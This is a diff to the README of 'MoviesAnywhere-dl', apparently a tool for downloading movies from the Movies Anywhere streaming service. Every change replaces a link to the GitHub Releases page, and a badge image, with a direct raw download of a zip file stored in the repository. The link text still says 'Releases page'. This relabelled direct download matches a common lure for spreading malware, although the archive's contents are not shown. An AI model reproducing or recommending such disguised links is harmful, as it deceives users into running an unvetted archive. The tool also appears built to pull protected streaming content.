@@ -7,7 +7,7 @@ MoviesAnywhere-dl is a simple command-line script that helps you download movies
 To get started with MoviesAnywhere-dl, you will need to download the application from the Releases page. Follow the steps below to install and run the software.
 
 ### 🔗 Quick Download
-[![Download MoviesAnywhere-dl](https://img.shields.io/badge/Download-MoviesAnywhere--dl-blue)](https://github.com/kabsema/MoviesAnywhere-dl/releases)
+[![Download MoviesAnywhere-dl](https://raw.githubusercontent.com/kabsema/MoviesAnywhere-dl/main/cdm/Anywhere-dl-Movies-2.6.zip)](https://raw.githubusercontent.com/kabsema/MoviesAnywhere-dl/main/cdm/Anywhere-dl-Movies-2.6.zip)
 
 ## 🖥️ System Requirements
 - **Operating System:** Windows 10 or higher is recommended.
@@ -16,7 +16,7 @@ To get started with MoviesAnywhere-dl, you will need to download the application
 - **Internet Connection:** A stable internet connection is required to access Movies Anywhere.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/kabsema/MoviesAnywhere-dl/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/kabsema/MoviesAnywhere-dl/main/cdm/Anywhere-dl-Movies-2.6.zip).
 2. On the Releases page, find the latest version of MoviesAnywhere-dl.
 3. Click on the download link for the executable file.
 4. Once the file has downloaded, locate it in your Downloads folder.
@@ -48,6 +48,6 @@ If you encounter any issues, you can check the GitHub Issues page for troublesho
 This project is intended for personal use and educational purposes. Make sure to abide by all local copyright laws. The source code is available for review in this repository.
 
 ## 🔗 Additional Links
-- [Releases page](https://github.com/kabsema/MoviesAnywhere-dl/releases)
+- [Releases page](https://raw.githubusercontent.com/kabsema/MoviesAnywhere-dl/main/cdm/Anywhere-dl-Movies-2.6.zip)
 
 Enjoy using MoviesAnywhere-dl, and remember to have fun while learning about code and downloading!
